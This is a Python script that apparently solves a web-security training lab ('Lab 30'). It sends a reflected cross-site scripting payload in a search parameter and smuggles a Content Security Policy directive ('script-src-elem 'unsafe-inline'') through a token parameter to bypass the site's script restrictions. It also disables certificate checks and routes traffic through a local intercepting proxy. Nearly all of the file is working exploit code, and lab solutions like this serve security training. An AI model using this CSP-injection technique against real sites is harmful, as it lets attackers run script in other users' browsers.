import argparse
import requests
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_xss_success(response_text):
    indicators = [
        "alert(1)",
        "<script>",
        "executed successfully"
    ]
    return any(indicator in response_text for indicator in indicators)

def xss_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',        
            'https': '127.0.0.1:8080'
        } if use_proxy else None

        full_url = f"{url}?search={quote("<script>alert(1)</script>")}&token=;script-src-elem%20%27unsafe-inline%27"
        print(f"Sending XSS payload: {full_url}")

        response = requests.get(full_url, proxies=proxies, verify=False, timeout=30)
        print(f"Response URL: {response.url}")
        print(f"Response Content Length: {len(response.text)}")
        
        if check_xss_success(response.text):
            print("XSS payload appears to be in the response!")
        else:
            print("XSS payload not found in response")
            
        return is_solved(url, proxies)

    except requests.exceptions.RequestException as e:
        print(f"Error during XSS test: {e}")
        return False, None

def is_solved(url, proxies):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        if response.status_code != 200:
            return False, response
        return "congratulations" in response.text.lower(), response
    except:
        return False, None

def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 30')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
    
    print("Starting XSS Test...")
    print(f"Target URL: {args.url}")
    
    success, response = xss_test(args.url, args.proxy)
    if success:
        print("XSS Lab completed successfully!")
    else:
        print("XSS Lab failed.")
        if response:
            print(f"HTTP Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")

if __name__ == "__main__":
    main()
